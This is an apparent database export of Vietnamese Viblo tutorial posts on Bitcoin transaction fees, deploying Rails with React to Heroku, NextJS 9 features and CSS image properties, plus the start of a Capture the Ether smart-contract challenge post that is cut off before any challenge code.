khoản phí giao dịch nào không?\n- Chắc chắn là **`có`** rồi !\n- Phí giao dịch được tính bởi nhiều yếu tố. Một số ví cho phép bạn đặt các khoản phí này một cachs thủ công. Bạn sẽ thấy tổng tất cả đầu ra của các transaction sẽ không bằng tổng tất cả các đầu vào, đó được ngầm hiểu chính là phí giao dịch và phì này sẽ được dành cho các miner có công xác thực giao dịch. Ví dụ, Alice gửi cho Bob 1 BTC, ví của Alice sẽ ghi nhận đã chuyển cho Bob là 1,00045 BTC thì 0,00045 BTC này là phí dành cho miner, trong khi Bob vẫn nhận đủ 1 BTC. Điều này dẫn đến một số miner sẽ kiếm thêm khoảng phí trên ngoài phần thưởng từ việc tìm ra block.\n\n- Hiện tại, một số miner vẫn xử lý nhiều giao dịch không phí nhưng khi phần thưởng từ các block giảm, điều này sẽ ít xảy ra.\n\n# Kết luận\n- Qua đây ta sẽ có cái nhìn tổng quan hơn về cách thức hoạt động bên dưới của những giao dịch bitcoin. Và cũng để giải thích cho những ai tò mò rằng không biết các giao dịch bạn vẫn thực hiện hằng ngày kia thực chất chúng hoạt động như thế nào, có thể đây sẽ là những câu trả lời cho bạn\n\n### Nguồn :\nhttps://www.coindesk.com/information/how-do-bitcoin-transactions-work\n\nhttps://bitcoinplay.net/bitcoin-transactions/\n\nhttp://stansberrypacific.com/	Giới Thiệu\n- Hiện nay với sự phát triển của thị trường tiền điện tử(Crypocurrency) , việc mua vào các bitcoin là một ý tưởng tuyệt vời nếu bạn là một nhà đầu tư và có niềm tin là nó sẽ còn tiếp tục lên. Nhưng bạn đã bao giờ tự hỏi vậy các giao dịch(transaction) bitcoin này hoạt động như thế nào. Để trả lời cho câu hỏi này chúng ta sẽ đi vào các đặc điểm cơ bản của một transaction bitcoin.\n\n- Cá...	{https://images.viblo.asia/8edf951b-ad6c-4bb7-b67c-8f60fc1e08c0.png,https://images.viblo.asia/cbdbd442-80a2-4911-b9f4-2e3d85248d6e.png,https://images.viblo.asia/b4a722a1-b7a0-4088-9117-739ed2678d87.png,https://images.viblo.asia/c67b5a00-c8e8-4864-b648-cf2765a48d2c.jpg,https://images.viblo.asia/c47021b5-9113-470e-b323-90ccb89af04a.jpg,https://images.viblo.asia/8fbc0b8b-8ac7-4e34-876d-a206afa5df76.jpg,https://images.viblo.asia/2c26c1a4-4776-4e2b-a8dd-a731f297f9fa.jpg}	1	Hiểu Một Cách Tổng Quát Về Các Giao Dịch Trong Bitcoin	{blockchain,bitcoin}	0	f	2022-12-18 15:33:38.338+00	2022-12-18 15:33:38.338+00
31917	# Giới thiệu\nReactjs hiện đang là một trong những sự lựa chọn hàng đầu của các lập trình viên về phát triển các ứng dụng web, đối với framework Ruby on Rails thì cũng đã tích hợp được React vào trong source code của project. Có nghĩa là chúng ta chỉ cần 1 server để deploy và có thể chỉ cần sử dụng Rails routes mà không cần dùng đến React routes. Để làm được điều này thì có một vài cách, trong trường hợp này mình sử dụng gem webpacker và gem react_on_rails để thực hiện.\n# Tạo project sử dụng gem react_on_rails\nĐầu tiên chúng ta tạo 1 project rails như bình thường:\n![](https://images.viblo.asia/cb5e3dbd-4929-41b2-bd99-47007d0f1ec1.png)\n\nSau đó mở file Gemfile và thêm vào 2 dòng sau:\n\n`gem "webpacker", "~> 3"`\n`gem "react_on_rails", "11.1.4"`\n\nsau đó quay lại terminal và chạy `"bundle install"`\n![](https://images.viblo.asia/3647de87-0f5b-43be-b916-96c5edba33a6.png)\n\nBạn nào chưa cài `yarn` thì ấn vào [đây](https://yarnpkg.com/lang/en/docs/install/#debian-stable) để xem cách cài nhé, `yarn` nó cũng có chức năng như `npm` thôi :D\n\nTiếp theo chạy lần lượt 2 câu lệnh này để cài đặt webpacker và reactjs\n![](https://images.viblo.asia/8cbde7d5-b954-43c5-9038-52e55b11b34e.png)\n![](https://images.viblo.asia/367a1df3-2b94-41d8-a870-47cf9e09190a.png)\n\nSau khi xong chúng ta cần commit lại và tiếp tục chạy câu lệnh sau để react_on_rails tự cài đặt:\n![](https://images.viblo.asia/9c359371-b87f-4ba7-a669-8733370f8e7a.png)\n\nCơ bản là xong rồi, chúng ta chạy câu lệnh sau để start project:\n![](https://images.viblo.asia/289c0109-7dfa-4c6e-8ba1-b96e3372a82a.png)\n\nNếu bạn nào chưa cài `foreman` thì cài như sau là được, nhớ chạy bằng sudo nha (mình chụp nhanh quá quên thêm sudo :D ):\n![](https://images.viblo.asia/3c1b6231-cda2-4b30-8475-2f86e13bcda4.png)\n\nOk, giờ thì mở trình duyệt lên và truy cập `localhost:3000/hello_world` để xem kết quả nhé, và đã xuất hiện dấu hiệu của react\n![](https://images.viblo.asia/b1876ee8-308f-4337-9cef-2cea6ab8748b.png)\n\nSau khi đã hoàn thành project, nếu bạn đang sử dụng sqlite thì cần chuyển sang postgre hoặc mysql, sau đó thêm file có tên là ```Procfile``` vào trong project ( cùng cấp với các folder app, config, ...) để có thể start được project bên phía heroku. Nội dung bên trong ghi như sau:\n```web: bundle exec puma -C config/puma.rb``` sau đó lưu lại và commit tất cả trước khi deploy.\n![](https://images.viblo.asia/d75d17f6-fbe2-4c14-989d-6b9b4946fb9b.png)\n# Deploy project lên heroku \nCấu hình server heroku: \n\nChúng ta sẽ tạo 1 app như bình thường:\n![](https://images.viblo.asia/81e264c7-8f08-43f7-8346-978ee0b37fea.png)\nTiếp theo chọn vào mục Setting, lăn chuột xuống phần Buildpacks và thêm buildpack như mình:\n![](https://images.viblo.asia/ad392ade-4da8-4eea-a10d-30e0b604426e.png)\nNhớ thêm đúng thứ tự như mình nhé.\nSau đó mở terminal lên và chạy lệnh ```heroku git:remote -a test-0874``` thay test-0874 bằng tên app heroku của bạn là được, rồi chạy lệnh ```git push heroku master``` là xong.\n![](https://images.viblo.asia/5dea22be-74d2-45cd-affe-0278226230d2.png)\nChúc các bạn thành công!!! :D\n# Tham khảo\n* [https://shakacode.gitbooks.io/react-on-rails/content/docs/tutorial......](https://shakacode.gitbooks.io/react-on-rails/content/docs/tutorial.html?fbclid=IwAR0dtkNdn0n7BmppsTeCa_N6mF_lmSILQsQLGnNAQNU6VUa_j2qkhR6t1rY)\n* [https://github.com/shakacode/react_on_rails](https://github.com/shakacode/react_on_rails)\n* [https://yarnpkg.com/lang/en/docs/install/#debian-stable](https://yarnpkg.com/lang/en/docs/install/#debian-stable)	Giới thiệu\nReactjs hiện đang là một trong những sự lựa chọn hàng đầu của các lập trình viên về phát triển các ứng dụng web, đối với framework Ruby on Rails thì cũng đã tích hợp được React vào trong source code của project. Có nghĩa là chúng ta chỉ cần 1 server để deploy và có thể chỉ cần sử dụng Rails routes mà không cần dùng đến React routes. Để làm được điều này thì có một vài cách, trong trư...	{https://images.viblo.asia/cb5e3dbd-4929-41b2-bd99-47007d0f1ec1.png,https://images.viblo.asia/3647de87-0f5b-43be-b916-96c5edba33a6.png,https://images.viblo.asia/8cbde7d5-b954-43c5-9038-52e55b11b34e.png,https://images.viblo.asia/367a1df3-2b94-41d8-a870-47cf9e09190a.png,https://images.viblo.asia/9c359371-b87f-4ba7-a669-8733370f8e7a.png,https://images.viblo.asia/289c0109-7dfa-4c6e-8ba1-b96e3372a82a.png,https://images.viblo.asia/3c1b6231-cda2-4b30-8475-2f86e13bcda4.png,https://images.viblo.asia/b1876ee8-308f-4337-9cef-2cea6ab8748b.png,https://images.viblo.asia/d75d17f6-fbe2-4c14-989d-6b9b4946fb9b.png,https://images.viblo.asia/81e264c7-8f08-43f7-8346-978ee0b37fea.png,https://images.viblo.asia/ad392ade-4da8-4eea-a10d-30e0b604426e.png,https://images.viblo.asia/5dea22be-74d2-45cd-affe-0278226230d2.png}	1	Cách tạo một project Rails/ReactJS sử dụng gem react_on_rails đơn giản và deploy lên heroku	{reactjs,heroku,rails,react-on-rails}	0	f	2022-12-18 15:33:38.374+00	2022-12-18 15:33:38.374+00
31909	## 1. Mở đầu\n<hr>\n\nChào mừng các bạn đến với phần 2 của bài viết tìm hiểu về `NextJS`. Trong [bài viết trước](https://viblo.asia/p/tim-hieu-ve-nextjs-p1-djeZ1bNjlWz) của mình đã đề cập cho các bạn một số khái niệm như:\n- Tạo ứng dụng NextJS\n- Sử dụng SCSS trong NextJS\n- Sử dụng các file static\n- Sử dụng next/head cho việc chia sẻ\n- Fetch dữ liệu từ server\n- Routing và Link trong NextJS.\n\n<br>\n\nNếu bạn vẫn chưa đọc thì bạn có thể theo dõi lại tại [đây](https://viblo.asia/p/tim-hieu-ve-nextjs-p1-djeZ1bNjlWz). Bây giờ chúng ta cùng bắt đầu với nội dung của phần 2 nào.\n\n## 2. NextJS 9\n<hr>\n\nTrước khi đi vào nội dung bài viết thì mình muốn báo cho các bạn là ở phần 1 những gì mình tìm hiểu là trên `NextJS` phiên bản **8.1.0**. Tuy nhiên vào ngày `8/7/2019` thì `NextJS` đã chính thức ra mắt phiên bản **9.0.1** với những cải tiến mới. Tuy nhiên ở phần này mình sẽ không đề cập đến toán bộ những nâng cấp đó mà chỉ đề cập đến duy nhất một phần đó là `Routing` đã được cập nhật trong phiên bản này. \n<br>\n\nVới những kiến thức mình cung cấp cho bạn ở phần trước khi vẫn hoàn toàn sử dụng được ở phiên bản mới này.\n\n## 3. NextJS9\n<hr>\n\n### a. Routing\n\nNếu bạn còn nhớ ở trong phần trước ở phần [Routing](https://viblo.asia/p/tim-hieu-ve-nextjs-p1-djeZ1bNjlWz#_f-routing-7) để chúng ta có thể sử dụng **Server Side Rendering** với các url có chứa tham số như `/post/:postId` thì ta sẽ phải tạo một file `server.js` có nội dung như sau để có thể xử lý các dynamic router này:\n```js\nconst express = require('express');\nconst next = require('next');\n\nconst dev = process.env.NODE_ENV !== 'production';\nconst app = next({ dev });\nconst handle = app.getRequestHandler();\nconst server = express();\n\napp.prepare()\n    .then(() => {\n\n    \t// Slug on url\n        server.get('/post/:postId', (req, res) => {\n            console.log(req.params.postId);\n            return app.render(req, res, '/post', { postId: req.params.postId })\n        });\n\n        server.get('*', (req, res) => {\n            return handle(req, res);\n        });\n\n        server.listen(3000, err => {\n            if (err) console.log(err)\n            console.log('> Ready on port 3000');\n        })\n    })\n    .catch(err => {\n        console.log(err);\n        process.exit();\n    });\n```\n\nĐiều này sẽ dẫn đến mỗi khi muốn thêm một dynamic url như trên bạn bắt buộc phải thêm nội dung cả file mới này. Nhưng với phiên bản 9 này thì chúng ta sẽ không cần làm điều đó nữa. Vẫn với trường hợp như trên, bạn muốn tạo ra url có dạng `/post/:postId` với `postId` là giá trị thay đổi tùy thuộc vào bạn muốn xem chi tiết bài viết nào thì ta sẽ tạo folder như sau\n```js\n/pages/post/[postId].js\n```\n\nVẫn áp dụng quy tắc tạo router như ở trong phần một mình có nói nhưng ở đây bên trong folder `/post` ta sẽ tạo hẳn 1 file là `[postId].js` (bạn lưu ý là phải có  phần ngoặc vuông "[]") . Việc tạo trên sẽ cho ta một url có dạng `http://my-domain.com/post/:postId` với `postId` là string bất kì.  Bên trong file `[postId].js` là một component bình thường:\n```js\nimport React, { Component } from 'react';\n\nclass PostDetail extends Component {\n\n    static async getInitialProps({ query }) {\n        const { postId } = query;\n        const { data } = await axios.get(`http://domain.com/posts/${postId}`);\n        \n        return {\n            post: data\n        }\n    }\n\n    render() {\n        return (\n            <div>\n                {this.props.post.title}\n            </div>\n        );\n    }\n}\n\nexport default PostDetail;\n\n```\n\nVà lấy tham số `postId` để gọi API lấy chi tiết bài viết đó. Có thể nói thay đổi của phần Routing trong phiên bản 9 này khá là hữu ích vì nó giúp ta loại bỏ được việc phải tạo riêng file `server.js` như trước kia. Thêm nữa không chỉ tạo được dynamic url dưới dạng đơn giản như kia mà bạn hoàn toàn có thể tạo cả folder dynamic như sau:\n```js\n/pages/blog/[blogId]/comments/[commentId].js\n    -> Url: http://my-domain.com/blog/:blodId/comments/:commentId\n```\nTrong component chứa trong file `[commentId]`.js` ta hoàn toàn có thể lấy cả `blogId` và `commenId` ra như trong ví dụ nói trên:\n```js\nimport React, { Component } from 'react';\n\nclass Comment extends Component {\n\n    static async getInitialProps({ query }) {\n        const { blogId, commentId } = query;\n        ...\n    }\n}\n\nexport default Comment;\n```\n\nCuối cùng là ở phiên bản này ở component `next/link` để có thể tạo ra url có dạng `http://my-domain.com/post/:postId` thì trong code ta sẽ viết dưới dạng:\n```js\n<NextLink href="/post?postId=1" as="/post/1">\n    <a>To post detail</a>\n</NextLink>\n```\nLý do tại sao thì bạn có thể đọc lại phần này tại [đây](https://viblo.asia/p/tim-hieu-ve-nextjs-p1-djeZ1bNjlWz#_g-link-8). Còn trong phiên bản 9 này thì ta chỉ cần viết bình thường là\n```js\n<NextLink href="/post/1">\n    <a>To post detail</a>\n</NextLink>\n```\nĐó là phần thay đổi mình muốn nói lại cho các bạn biết còn sau đây chúng ta sẽ đi tiếp vào khác nội dung khác của `NextJS`.\n\n### b. Prefetch page\n\nNgoài những tính năng mặc định của **next/link** thì nó còn cung cấp cho chúng ta khả năng `prefetching`. Tuy nhiên chức năng này chỉ hoạt động trên môi trường `production`. Cụ thể mỗi `page` của bạn đã măc định được **Nextjs** complie thành các file riêng hay có thể gọi là các `chunk`. Khi bạn truy cập trang nào thì mới tiến hành tải file đó. Tuy nhiên với tính năng `prefetching` sẽ cho phép chúng ta tải trước các file này ở background để khi bạn truy cập url tương ứng với page đó thì sẽ lấy file js đó ra dùng luôn chứ không cần phải mới bắt đầu tải nó nữa. Đối với phiên bản 8 thì tất cả những gì ta cần thêm thuộc tính prefetch vào:\n```javascript\nimport NextLink from 'next/link'\n\n<NextLink href={{ pathname: '/post', query: {postId: '1'} }} as="/post/1" prefetch>\n\t<a>To post detail</a>\n</NextLink>\n```\nTuy nhiên thì ở phiên bản 9 việc prefetch sẽ được tự động thêm vào toàn bộ các component `next/link` một cách mặc định toàn bộ các url của các trang khác xuất hiện trên màn hình của chúng ta. Ngoài cách prefetch page bằng cách sử dụng **next/link** như trên ta cũng có thể sử dụng 1 API khác mà **Nextjs** cung cấp như sau:\n```javascript\nimport React from 'react';\nimport Link from 'next/link';\nimport { withRouter } from 'next/router';\n\nclass Home extends React.Component {\n    componentDidMount() {\n        this.props.router.prefetch('/about')\n    }\n    \n    render() {\n        return (\n        \t<div>\n            \t<Link href="/about">\n                    <a>About</a>\n                </Link>\n          \n                <Link href="/post/1">\n                    <a>PostPage</a>\n                </Link>\n            </div>\n        )\n    }\n}\n\nexport default withRouter(withRouter);\n```\nViệc bọc toàn bộ component của chúng ta với **withRouter** sẽ cho phép component của chúng ta sử dụng một props là router với các chức năng của **next/router**. Với phiên bản 9 thì việc prefetch là mặc định khi bạn sử dụng `next/link` tuy nhiên trong trường hợp bạn muốn ngăn chặn việc prefetch cho một số url mà người dùng ít khi vào thì ta có thể ngăn chặn nó bằng cách thêm một thuộc tính là `prefetch={false}` như sau:\n```js\nimport React from 'react';\nimport Link from 'next/link';\nimport { withRouter } from 'next/router';\n\nclass Home extends React.Component {\n    componentDidMount() {\n        this.props.router.prefetch('/about')\n    }\n    \n    render() {\n        return (\n        \t<div>\n                <Link href="/post/1" prefetch={false}>\n                    <a>PostPage</a>\n                </Link>\n            </div>\n        )\n    }\n}\n\nexport default withRouter(withRouter);\n```\n\n*Lưu ý: Prefetch chỉ hoạt động trên production build.*\n\n### c. Dynamic import\n\nTương tự với việc sử dujgn **lazy-load** trong **React** thì `Dynamic Import` của **Nextjs** hỗ trợ chúng ta trong việc tự động phân chia code thành các chunks nhỏ và tất nhiên nó cũng hỗ trợ SSR.\n\n##### Dyaminc import cơ bản\nĐể sử dụng `Dynamic Import` ta chỉ cần thêm **next/dynamic** vào file của chúng ta và gọi ra như sau:\n\n```javascript\nimport dynamic from 'next/dynamic';\n\nconst DynamicComponent = dynamic(() => import('../components/Hello'));\n\nfunction Home() {\n  return (\n    <div>\n      <Header />\n      <DynamicComponent />\n      <p>HOME PAGE is here!</p>\n    </div>\n  );\n}\n\nexport default Home;\n```\n\nVới cách import trên thì chỉ khi ta sử dụng đến hay nói cách khác là render ra `<DynamicComponent />` thì lúc đó ứng dụng của chúng ta mới load file js của component này về. Việc làm như vậy tránh cho việc chúng ta phải load toàn bộ các component trong khi thực tế chỉ cần dùng một số component.\n<br>\n\n##### Với component sử dụng named exports\nỞ ví dụ trên component `<Hello />` của chúng ta được export default cho nên ta chi cần import như vậy. Tuy nhiên trong trường hợp 1 file có chứa nhiều component và được export theo name như sau:\n\n```javascript\n// component.js\nexport const Hello = () => <div>Hello</div>\n\nexport const Bye = () => <div>Bye</div>\n\nexport const Hi = () => <div>Hi</div>\n```\n\nThì ta phải chọn chính xác component mà ta muốn sử dụng. Với **next/dynamic** ta có thể viết như sau:\n\n```javascript\nimport dynamic from 'next/dynamic';\n\nconst DynamicHello = dynamic(() => \n\timport('../component.js').then(component => component.Hello)\n);\n```\n\nCú pháp là tương tự với component `<Bye />` và `<Hi />`:\n\n```javascript\nconst DynamicBye = dynamic(() => \n\timport('../component.js').then(component => component.Bye)\n);\n\nconst DynamicHi = dynamic(() => \n\timport('../component.js').then(component => component.Hi)\n);\n```\n<br>\n\n##### Thêm hiệ ứng Loading\nĐể có UX thân thiện hơn khi load component dynamic thì **next/dynamic** còn cung cấp cho chúng ta khả năng hiển thị bất cứ phần UI nào ta muốn trong khi chờ load component dynamic như sau:\n\n```javascript\nimport dynamic from 'next/dynamic';\n\nconst DynamicHello = dynamic(() => \n\timport('../component.js').then(component => component.Hello),\n    {\n    \tloading: () => <p>Loading...</p>\n\t}\n);\n```\n<br>\n\n##### Bỏ qua SSR\nVới nhưng component chỉ hoạt động được trên browser vì sử dụng những thành phần như `window` hay `document` thì ta có thể sử dụng dynamic import để loại bỏ việc load component này ở phía server như sau:\n\n```javascript\nimport dynamic from 'next/dynamic';\n\nconst DynamicHello = dynamic(() => \n\timport('../component.js').then(component => component.Hello),\n    {\n    \tssr: false\n\t}\n);\n```\n<br>\n\n##### Load nhiều component đồng thời\nNgoài việc load từng component một thì ta cũng có thể load nhiều component dynamic cùng lúc như sau:\n```javascript\nimport dynamic from 'next/dynamic';\n\nconst HelloBundle = dynamic({\n  modules: () => {\n    const components = {\n      Hello1: () => import('../components/hello1'),\n      Hello2: () => import('../components/hello2')\n    };\n\n    return components;\n  },\n  render: (props, { Hello1, Hello2 }) => (\n    <div>\n      <h1>{props.title}</h1>\n      <Hello1 />\n      <Hello2 />\n    </div>\n  )\n});\n\nfunction DynamicBundle() {\n  return <HelloBundle title="Dynamic Bundle" />;\n}\n\nexport default DynamicBundle;\n```\nVới đoạn code trên ta sẽ load song song 2 component là `<Hello1 />` và `<Hello2 />` sau đó thực hiện render rồi trả về 1 component bọc 2 component vừa load được đó đem đi sử dụng.\n\n### d. Custom App.js\n\nNếu bạn đã làm việc với `ReactJS` thông thường thì chắc hẳn bạn sẽ để ý thấy sẽ có một file là `App.js` nơi bạn sẽ import toàn bộ các `<Router />` trong ứng dụng của bạn vào và mount component này ra trang của bạn. Tuy nhiên khi bạn tạo mộ ứng dụng `NextJS` với CLI mà mình cung cấp ở phần trước thì hoàn toàn không thấy file này đâu cả. Thực chất thì `NextJS` đã tạo sẵn một file mặc định cho bạn rồi và khi bạn chạy ứng dụng thì `NextJS` cũng sẽ gọi file này ra đầu tiên tương tự với việc mount file `App.js`. Tuy nhiên trong `NextJS` thì file này sẽ có tên là `_app.js` và nó nằm ở đường dẫn `/node_modules/next/dist/pages/_app.js` file này không chứa bất cứ gì đặc biệt cả nên chính vì thể `NextJS` cho phép chúng ta viết lại file này để có thể thêm những config khác mà chúng ta muôn. Để làm điều này bạn chỉ cần tạo một file tương ứng là `_app.js` trong folder `/pages/_app.js` với nội dung mặc định như sau:\n```js\nimport React from 'react';\nimport App, { Container } from 'next/app';\n\nclass MyApp extends App {\n  static async getInitialProps({ Component, ctx }) {\n    let pageProps = {};\n\n    if (Component.getInitialProps) {\n      pageProps = await Component.getInitialProps(ctx);\n    }\n\n    return { pageProps };\n  }\n\n  render() {\n    const { Component, pageProps } = this.props;\n\n    return (\n      <Container>\n        <Component {...pageProps} />\n      </Container>\n    );\n  }\n}\n\nexport default MyApp;\n```\nLưu ý nội dung nói trên là nội dung mặc định phải có trong file `_app.js` và bạn không nên xóa bất cử nội dung nào đi mà chỉ nên thêm vào các logic mới mà bạn mong muốn như:\n- Tạo một layout chung cho toàn bộ trang\n- Chia sẽ một state nào đó giữa toàn bộ các trang\n- Viết lại phần xử lý lỗi\n- ...\n\nGiả sử ở đây mình muốn mỗi khi ứng dụng của mình bị lỗi thì nó sẽ lưu lại lỗi này và lưu lại trên sentry thì ta sẽ sửa lại file `_app.js` này như sau:\n```js\nimport React from 'react';\nimport App, { Container } from 'next/app';\nimport sentry from '/utils/sentry'; // Đâu là file custom mình tạo ra\n\nclass MyApp extends App {\n  static async getInitialProps({ Component, ctx }) {\n    let pageProps = {};\n\n    if (Component.getInitialProps) {\n      pageProps = await Component.getInitialProps(ctx);\n    }\n\n    return { pageProps };\n  }\n\n  componentDidCatch(error, errorInfo) {\n      sentry.captureException(error, { extra: errorInfo })\n  }\n\n  render() {\n    const { Component, pageProps } = this.props;\n\n    return (\n      <Container>\n        <Component {...pageProps} />\n      </Container>\n    );\n  }\n}\n\nexport default MyApp;\n```\nVậy là xong, sau này nếu có bất cứ lỗi nào khiến app crash hoặc error nào đó thì nó sẽ được bắn lên trên sentry để bạn có thể vào xem bug và điều tra nguyên nhân và khắc phục.\n\n## 3. Kết bài\n<hr>\n\nBài viết của mình đến đây đã khá dài nên mình sẽ dừng lại ở đây. Sắp tới nếu mình tìm được thêm các kiến thức hay ho liên quan đến quá trình làm việc với `NextJS` thì mình sẽ tiếp tục chia sẻ cho các bạn. Nếu có bất kì vấn đề gì các bạn có thể comment ngay ở bên dưới. Cám ơn các bạn đã đọc bài.	1. Mở đầu\n\n\nChào mừng các bạn đến với phần 2 của bài viết tìm hiểu về NextJS. Trong bài viết trước của mình đã đề cập cho các bạn một số khái niệm như:\n- Tạo ứng dụng NextJS\n- Sử dụng SCSS trong NextJS\n- Sử dụng các file static\n- Sử dụng next/head cho việc chia sẻ\n- Fetch dữ liệu từ server\n- Routing và Link trong NextJS.\n\n<br>\n\nNếu bạn vẫn chưa đọc thì bạn có thể theo dõi lại tại đây. Bây giờ c...	{}	1	Tìm hiểu về NextJS (P2)	{reactjs,nextjs}	0	f	2022-12-18 15:33:38.399+00	2022-12-18 15:33:38.399+00
31898	# Lời nói đầu: \nCSS có rất nhiều thuộc tính liên quan đến image như : background images, border images, masking hay clipping mà bạn có thể thêm trực tiếp hình ảnh vào các trang web và kiểm soát hành vi của chúng.\nTuy nhiên, cũng có các thuộc tính CSS liên quan đến hình ảnh ít được đề cập hơn, hoạt động trên các hình ảnh được thêm bằng thẻ <img> HTML, cách ưa thích để thêm hình ảnh vào các trang web.\nChúng ta cùng tìm hiểu các thuộc tính ấy là gì nhé.\n\n\n# 1. Làm sắc nét hình ảnh với  image-rendering \nKhi một hình ảnh được nâng cấp, trình duyệt sẽ làm mịn hình ảnh, do đó, nó trông không giống pixel. Nhưng, tùy thuộc vào độ phân giải của hình ảnh và màn hình, điều này có thể không phải là tốt nhất mọi lúc. Bạn có thể kiểm soát hành vi trình duyệt này với thuộc tính **image-rendering property.**\nThuộc tính được hỗ trợ tốt này kiểm soát thuật toán được sử dụng để chia tỷ lệ hình ảnh. Hai giá trị chính của nó là **crisp-edge** và **pixelated.**\nGiá trị **crisp-edge**duy trì độ tương phản màu giữa các pixel. Nói cách khác, không làm mịn đối với hình ảnh, điều này rất tốt cho tác phẩm nghệ thuật\nKhi **pixelated** được sử dụng, các pixel của pixel gần đó có thể chiếm diện mạo của nó, làm cho nó giống như chúng tạo thành một pixel lớn, tuyệt vời cho màn hình độ phân giải cao..\nNếu bạn cứ nhìn kỹ vào các cạnh hoa trong GIF bên dưới, bạn có thể thấy sự khác biệt giữa hình ảnh thông thường và hình ảnh **pixelated.**\n```CSS\nimg {\n  image-rendering: pixelated;\n}\n```\n![](https://images.viblo.asia/6ceb79c2-e80e-4881-b1e0-b09017e3f08b.gif)\n\n# 2. Kéo dài hình ảnh với object-fit\nCác giá trị **contain**, **cover**, **fill** đều quen thuộc, chúng tôi sử dụng chúng cho thuộc tính kích thước nền để kiểm soát cách hình ảnh nền lấp đầy phần tử mà nó thuộc về. Thuộc tính object-fit khá giống với nó, vì nó cũng xác định kích thước hình ảnh bên trong vùng chứa của nó.\nGiá trị **contain** chứa hình ảnh trong thùng chứa của nó. **cover** cũng tương tự, nhưng nếu tỷ lệ khung hình của hình ảnh và vùng chứa không khớp với nhau, hình ảnh sẽ bị cắt bớt. **fill** làm cho hình ảnh kéo dài và fill vào thùng chứa của nó. giảm tỷ lệ chọn phiên bản nhỏ nhất của hình ảnh để hiển thị.\n```html\n<div id='container'>\n  <img src="rose.png' alt="rose flower'>\n</div>\n```\n```CSS\n    #container {\n  width: 300px;\n  height: 300px;\n}\nimg {\n  width: 100%;\n  height: 100%;\n  object-fit: contain;\n}\n```\n![](https://images.viblo.asia/7be91893-ed44-4106-a181-412773da84e9.gif)\n# 3. Thay đổi vị trí  hình ảnh với object-position\nTương tự như thuộc tính background-position, background-size, object-position cũng có một thuộc tính object-fit.\nThuộc tính object-fit di chuyển một hình ảnh bên trong một thùng chứa hình ảnh đến các tọa độ đã cho. Các tọa độ có thể được xác định là đơn vị độ dài tuyệt đối, đơn vị độ dài tương đối, từ khóa (trên cùng, bên trái, giữa, dưới và bên phải) hoặc kết hợp hợp lệ của chúng (trên 20px bên phải 5px, giữa bên phải 80px).\n\n```html\n<div id='container'>\n  <img src="rose.png' alt="rose flower'>\n</div>\n```\n\n```CSS\n#container {\n  width: 300px;\n  height: 300px;\n}\nimg {\n  width: 100%;\n  height: 100%;\n  object-position: 150px 0;\n}\n```\n\n![](https://images.viblo.asia/f6d725ba-479c-4240-be6e-12e55ed187d6.jpg)\n# 4. Tình huống căn chỉnh dọc hình ảnh với vertical-align\nĐôi khi chúng ta thêm <img> (theo bản chất là nội tuyến) bên cạnh chuỗi văn bản để thêm thông tin hoặc trang trí. Trong trường hợp đó, việc căn chỉnh văn bản và hình ảnh vào vị trí mong muốn có thể là một chút khó khăn nếu bạn không biết sử dụng thuộc tính nào.\nThuộc tính vertical-align không chỉ dành riêng cho các ô của bảng. Nó cũng có thể căn chỉnh một phần tử nội tuyến trong một hộp nội tuyến và do đó có thể được sử dụng để căn chỉnh một hình ảnh trong một dòng văn bản. Phải mất một số lượng lớn các giá trị có thể được áp dụng cho một phần tử nội tuyến, vì vậy bạn có nhiều tùy chọn để chọn.\n```html\n<p>\nPDF <img width="15px" src="pdf.png"\nstyle="vertical-align:text-top" alt="Image">\n</p>\n```\n![](https://images.viblo.asia/26f03308-c83e-4d5b-ac39-1e9d6e46c3ce.jpg)\n# 5. Tạo bóng cho hình ảnh  với filter: drop-Shadow ()\nKhi được sử dụng không rõ ràng trong các văn bản và hộp, bóng có thể thêm sự sống vào một trang web. Điều này cũng đúng với hình ảnh. Hình ảnh có hình dạng lõi và nền trong suốt có thể được hưởng lợi từ bộ lọc CSS bóng đổ.\nCác đối số của nó tương tự như các giá trị của các thuộc tính CSS liên quan đến bóng (text-shadow, drop-shadow). Hai cái đầu tiên biểu thị khoảng cách dọc và ngang giữa bóng và hình ảnh, thứ ba và thứ tư là độ mờ và bán kính trải của bóng và cái cuối cùng là màu bóng.\nGiống như bóng văn bản, bóng đổ cũng tạo ra một bóng được đúc theo đối tượng thuộc. Vì vậy, khi nó được áp dụng cho một hình ảnh, bóng sẽ có hình dạng của phần có thể nhìn thấy của hình ảnh.\n\n```CSS\nimg {\n  filter: drop-shadow(0 0 5px blue);\n}\n```\n![](https://images.viblo.asia/9e4fe791-4105-432b-a2fc-0a15a7416b13.jpg)\n# Nguồn: \nhongkiat.com	Lời nói đầu:\nCSS có rất nhiều thuộc tính liên quan đến image như : background images, border images, masking hay clipping mà bạn có thể thêm trực tiếp hình ảnh vào các trang web và kiểm soát hành vi của chúng.\nTuy nhiên, cũng có các thuộc tính CSS liên quan đến hình ảnh ít được đề cập hơn, hoạt động trên các hình ảnh được thêm bằng thẻ <img> HTML, cách ưa thích để thêm hình ảnh vào các trang we...	{https://images.viblo.asia/6ceb79c2-e80e-4881-b1e0-b09017e3f08b.gif,https://images.viblo.asia/7be91893-ed44-4106-a181-412773da84e9.gif,https://images.viblo.asia/f6d725ba-479c-4240-be6e-12e55ed187d6.jpg,https://images.viblo.asia/26f03308-c83e-4d5b-ac39-1e9d6e46c3ce.jpg,https://images.viblo.asia/9e4fe791-4105-432b-a2fc-0a15a7416b13.jpg}	1	5 Thuộc tính CSS với thẻ <IMG> bạn nên biết	{css,img}	0	f	2022-12-18 15:33:38.448+00	2022-12-18 15:33:38.448+00
31875	### **Capture the ether là gì?**\n\nCapture the ether là nơi bạn tìm cách hack các Ethereum smart contract để học về bảo mật thông qua chơi game. Game bao gồm các series thử thách được chia theo chủ đề với độ khó khác nhau. Độ khó càng cao thì càng kiếm được nhiều điểm. Truy cập https://capturetheether.com/ để tham gia chơi.\nĐể hoàn thành các thử thách, bạn sẽ cần cài đặt và có một số kiến thức cơ bản về các thứ sau:\n* Cài đặt Metamask.\n* Tạo một account trên Ropsten Testnet, sau đó vào https://faucet.metamask.io/ để lấy vài ether.\n* Bật Remix IDE https://remix.ethereum.org\n\nPhần Warm up được thiết kế để bạn có thể chuẩn bị và học cách sử dụng các công cụ cần thiết, vậy nên trong bài viết này chúng ta sẽ đi tới luôn phần tiếp theo Lotteries và cùng tìm hiểu xem các smart contract về Lotteries có đảm bảo tính ngẫu nhiên và công bằng như ta vẫn nghĩ\n### 1. Guess the number\n```js\npragma solidity ^0.4.21;\n\ncontract GuessTheNumberChallenge 